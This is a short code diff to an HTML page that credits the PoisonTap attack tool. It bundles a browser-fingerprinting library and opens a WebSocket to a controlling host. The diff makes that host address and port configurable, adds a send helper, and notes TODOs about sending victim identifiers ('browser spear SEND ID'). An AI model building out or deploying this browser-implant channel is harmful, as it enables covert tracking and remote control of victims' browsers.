@@ -1,7 +1,5 @@
 <!-- based on poisontap by samy kamkar -->
 <div id="content"></div>
-
-<!--TODO TEST FINGERPRINT-->
 <script type="text/javascript">
 /*
 * Fingerprintjs2 1.5.1 - Modern & flexible browser fingerprint library v2
@@ -1346,7 +1344,20 @@
 <script type="text/javascript">
 var obj;
 var content = document.getElementById('content');
-var socket = new WebSocket('ws://localhost:1337');
+if (host_addr) {
+} else {
+	host_addr='localhost'
+}
+if (host_port) {
+} else {
+	host_port='1337'
+}
+
+function send(obj){
+	socket.send(JSON.stringify(obj));
+}
+
+var socket = new WebSocket('ws://'+host_addr+':'+host_port);
 socket.onopen = function () {
 	socket.send(JSON.stringify({'req': 'hi'}));
 	//TODO browser spear SEND ID
